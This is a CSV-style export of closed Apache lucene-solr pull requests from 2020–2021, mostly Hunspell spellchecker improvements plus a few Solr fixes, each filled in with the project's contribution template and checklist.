"","2378","LUCENE-9779: Hunspell: add an API to interrupt long computations","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  For example, to ensure responsiveness, IntelliJ-based IDEs periodically call a special method which can throw a dedicated exception. This allows the currently executed computation to be interrupted and release all the locks it holds, allowing the UI thread to grab them as quickly as possible.  # Solution  Pass a `Runnable` to `Hunspell` constructor that may throw whatever exceptions the environment expects when needed  # Tests  `HunspellTest.testCheckCanceled`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-16T14:19:55Z","2021-02-17T09:00:44Z"
"","2316","LUCENE-9739: Hunspell: speed up numeric flag parsing","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Flags in `FLAG num` mode were quite expensive to parse: strings were split by a regexp compiled every time.  # Solution  I avoid regexps at all by hand-coding their quite simple ""ignore non-digit characters"" and ""split by comma, ignoring empty parts"" logic.  # Tests  Manual. I've observed ~20% speedup on (non-parallelized) `TestAllDictionaries` (wooorm repo)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-07T13:38:10Z","2021-02-08T10:13:45Z"
"","1970","SOLR-14869: do not add deleted docs in child doc transformer","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Fixes [SOLR-14869](https://issues.apache.org/jira/browse/SOLR-14869)  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","hacktoberfest-accepted,","barrotsteindev","2020-10-09T18:55:20Z","2020-10-14T12:26:14Z"
"","2332","LUCENE-9750: Hunspell: improve suggestions for mixed-case misspelled words","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Fix a failing Hunspell repo test  # Solution  Replicate Hunspell's logic around suggestion casing, especially mixed-case ones  # Tests  `i58202` from Hunspell repo, whatever that means  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-09T09:14:02Z","2021-02-10T08:28:55Z"
"","2376","LUCENE-9778: Hunspell: speed up input conversion","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Every input is converted to StringBuilder and then back, and an ICONV FST is (expensively) traversed for each char of the input. That takes some CPU time, up to 15% for English.  # Solution  Extract ICONV/OCONV analysis into a new `ConvTable` class Keep there hashes of first chars of all keys to quickly check if this table would do anything at all Initialize FST stuff lazily on traversal Add `Dictionary.needsInputCleaning(word)` to check if input conversion may do anything, and use it to avoid calling it where possible  # Tests  No behavior change; `TestDictionary` adapted to the new architecture  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-16T13:40:46Z","2021-02-17T09:00:39Z"
"","2315","LUCENE-9735: Hunspell: speed up flag checks by avoiding allocations","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Each `Dictionary.decodeFlags` (and most `hasFlag`) checks allocated a `char[]`, in many cases only searched once  # Solution  Check for flags for the given entry ID without allocations. Instead of `BytesRefHash`, store the sorted flags in a contiguous `char[]` built in a similar way (but without hashtable overhead after it's fully built), use offsets there as ids (like `BytesRefHash` does), store the length of the sub-array in the first char at the identifying offset. Search linearly instead of binary, as it results in a bit better performance.  # Tests  I've got got 10-20% improvement on a manual check in `de` and `fr` in `TestPerformance`.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-07T13:32:43Z","2021-02-08T10:13:59Z"
"","2432","LUCENE-9812: Hunspell: honor empty stripping affixes when generating suggestions","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  e.g. inflect German ""kennen"" into ""kenne""  # Solution  Process empty affixes as well, remove strip before checking affix conditions  # Tests  Enriched `ngram` test  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-25T16:35:33Z","2021-02-26T09:27:56Z"
"","2420","LUCENE-9805: Hunspell: fix space + mixed case heuristics on suggestions","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  e.g. in English, for ""ESPs"" Hunspell suggests ""ESP s"" while Lucene suggests ""ESP S"". The former seems better.  # Solution  Fix inaccuracies in reproducing Hunspell's logic  # Tests  `sug` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-23T11:05:39Z","2021-02-23T16:38:20Z"
"","2277","LUCENE-9716: Hunspell: support flag usage before its format is even specified","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  e.g. `nl` dictionaries first have `KEEPCASE Kc` and only then `FLAG long`  # Solution  Like Hunspell/C++, read affix twice: first extract important info like encoding and flag format, next — the rest.  # Tests  Added  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-01T10:27:08Z","2021-02-05T08:47:52Z"
"","2254","LUCENE-9703: Hunspell: prohibit FORBIDDENWORD words and their case variations","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Dutch `Ijs` should not be accepted  # Solution  Check for word forbiddenness earlier  # Tests  Added `Ijs` case to `IJ` test  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-27T17:10:13Z","2021-01-29T08:14:00Z"
"","2340","LUCENE-9758: Hunspell: support NOSUGGEST option","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  don't suggest NOSUGGEST and SUBSTANDARD dictionary entries and their derivations  # Solution  Check for these flags when enumerating suggestions. To avoid passing `boolean forSuggestions` everywhere, subclass `SpellChecker` used for enumerating suggestions.  # Tests  `nosuggest` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-10T08:43:10Z","2021-02-11T08:28:55Z"
"","2368","LUCENE-9770: Hunspell: don't perform compound check recursively when …","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Don't perform compound check recursively when looking for word pairs. This slows down compound checks quite a lot.  # Solution  Call `checkSimpleWord` instead  # Tests  Not affected. Spellchecking in `TestPerformance.de` becomes 25% faster for me.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T09:31:07Z","2021-02-15T19:27:53Z"
"","1710","SOLR-14604: Uninstall package cli command","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Developers should be able to uninstall a package they upload via the package management system. If a package becomes vulnerable, it's code should be completely removable from the system, for instance.   # Solution  Add a CLI command to delete a package.  # Tests  Requires manual integration test.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-08-02T08:50:10Z","2020-08-05T08:56:02Z"
"","2217","LUCENE-9676: Hunspell: improve stemming of all-caps words","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Currently words like ""OPENOFFICE.ORG"" result in no stems even if the dictionary contains ""OpenOffice.org""  # Solution  Repeat Hunspell's logic: * when encountering a mixed- or (inflectable) all-case dictionary entry, add its title-case analog as a hidden entry * use that hidden entry for stemming case variants for title- and uppercase words, but don't consider it a valid word itself * ...unless there's another explicit dictionary entry of that title case  # Tests  Adapted `allcaps` from Hunspell C++ repository, corrected existing `TestEscaped` to match Hunspell's behavior. # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-18T18:24:14Z","2021-01-19T12:36:34Z"
"","2246","LUCENE-9694: New tool for creating a deterministic index","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Create a new tool `IndexRearranger`, which could rearrange a built index concurrently to desired segment number and document distribution  # Solution  Essentially combines `IndexWriter.addIndexes` and `FilterCodecReader` to select only certain documents into 1 segment  # Tests  Added one unit test testing rearranger.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zhaih","2021-01-26T03:34:33Z","2021-01-29T18:32:43Z"
"","2207","LUCENE-9667: Hunspell: add spellchecker API, support BREAK and FORBIDDENWORD affix rules","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Create a `SpellChecker` class in the API with `spell` method that should mirror Hunspell in future. For start, support word splitting by BREAK directive.  # Solution  the new code is based on https://github.com/hunspell/hunspell/blob/master/src/hunspell/hunspell.cxx#L675  # Tests  Test data taken from hunspell C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-15T12:40:02Z","2021-01-20T12:46:20Z"
"","2053","LUCENE-8626: Standardize Lucene Test Files Part 2","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Continuation of the effort to standardize test files in the Lucene/Solr project.  # Solution  Renamed a subset of files and made a few small changes so that the tests are still valid.   # Tests  all the files here are tests.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-11-01T05:05:23Z","2020-11-17T13:13:14Z"
"","2280","LUCENE-9717: Hunspell: support CHECKCOMPOUNDPATTERN","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  CHECKCOMPOUNDPATTERN prohibits specific patterns from occurring in compound words. Used e.g. in Dutch  # Solution  Check the pattern (both text and stem flags) on adjacent compound parts.  # Tests  `checkcompoundpattern*` from Hunspell/C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-01T12:46:56Z","2021-02-03T08:58:49Z"
"","1713","SOLR-14703 Edismax parser replaces whitespace characters with spaces","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Changing `ExtendedDismaxQParser.splitIntoClauses()` to start a new clause when `""` is encountered.   # Solution  Added a logic to start a new clause, if we encountered `""` and are not in `inString` mode, and `ignoreQuote` is `false`.  This will trigger existing logic of properly processing values in double quotes.  # Tests  Added a test that covers the error: `""q"", ""cat_s:[\""foo\nfoo\"" TO \""foo\nfoo\""]""`, as long as number of tests that check regression in some cases for whitespace chars and for double quotes.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","yuriy-b-koval","2020-08-03T00:29:44Z","2020-08-14T18:12:53Z"
"","1811","SOLR-14799: JWT authentication plugin only requires ""sub"" claim when principalClaim=sub","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Change for JWT authentication plugin to only require ""sub"" claim when principalClaim=sub  # Solution  Removed setSubject() call.  # Tests  Ensure existing tests still pass, and adjust one test that equated subject and principal.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","erikhatcher","2020-08-31T22:51:25Z","2020-11-10T22:44:51Z"
"","2260","LUCENE-9704: Hunspell: support capitalization for German ß","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Capitalized ß is SS and some SS's decapitalize to ß (but only some)  # Solution  When decapitalizing, try replacing all reasonable subsets of SS occurrences with ß.  # Tests  `checksharps` from Hunspell/C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-28T08:36:55Z","2021-01-29T10:49:37Z"
"","1688","SOLR-14675: CloudHttp2SolrClient async request method","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  As of now, the [Http2SolrClient](https://github.com/apache/lucene-solr/blob/master/solr/solrj/src/java/org/apache/solr/client/solrj/impl/Http2SolrClient.java) and the [LBHttp2SolrClient](https://github.com/apache/lucene-solr/blob/master/solr/solrj/src/java/org/apache/solr/client/solrj/impl/LBHttp2SolrClient.java) both have support for making async requests, but there isn't a way to use these methods from a [CloudHttp2SolrClient](https://github.com/apache/lucene-solr/blob/master/solr/solrj/src/java/org/apache/solr/client/solrj/impl/CloudHttp2SolrClient.java). My change introduces an async request method to the CloudHttp2SolrClient which internally calls the LBHttp2SolrClient's async request method, and returns a Cancellable.  # Solution  I created a new method `CloudHttp2SolrClient#asyncRequest(SolrRequest request, String collection, AsyncListener> asyncListener)` which makes an async request. In BaseCloudSolrClient, I modified `requestWithRetryOnStaleState` and `sendRequest` to take in an AsyncListener parameter, and they check if the listener is null or not to determine whether or not to make an async request. To return a Cancellable in the asyncRequest without changing the return type of the BaseCloudSolrClient request methods, the `BaseCloudSolrClient#makeRequest` method returns a NamedList containing the Cancellable object to be returned by the CloudHttp2SolrClient's asyncRequest method.  # Tests  I have added a test to [CloudHttp2SolrClientTest.java](https://github.com/apache/lucene-solr/blob/master/solr/solrj/src/test/org/apache/solr/client/solrj/impl/CloudHttp2SolrClientTest.java) that confirms that successful async requests result in an `onSuccess()` callback method being run. This test only serves to confirm that async requests properly branch to the `LBHttp2SolrClient.asyncReq()` method; it doesn't check the correctness of the response (i.e. it assumes that `LBHttp2SolrClient.asyncReq()` works correctly).  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","rishisankar","2020-07-23T02:03:31Z","2020-08-20T23:46:49Z"
"","2423","LUCENE-9806: Hunspell: speed up affix condition checking","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Affix condition checking takes quite a lot of time in morphologically rich languages, e.g. French/Portuguese  # Solution  check only stem beginning/end without strip/condition, not the whole candidate avoid regexp if possible  # Tests  No new tests. `TestPerformance.fr*` has 8-15% speedups for me.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-23T16:49:39Z","2021-02-24T17:46:49Z"
"","2229","LUCENE-9688: Hunspell: consider prefix's continuation flags when applying suffix","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  aff: SFX s Y 1 SFX s 0 s .  PFX p Y 1 PFX p 0 0/s .  dic: calorie/p  ""calories"" should be accepted  # Solution  When applying suffix ""s"" (which expects ""s"" flag to be set), check not only the word itself (which only has ""p"") flag, but the continuation flags of the just applied prefix ""p"" which has ""s"" as its continuation.  # Tests  `TestDependencies` updated  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-21T14:24:47Z","2021-01-22T11:41:49Z"
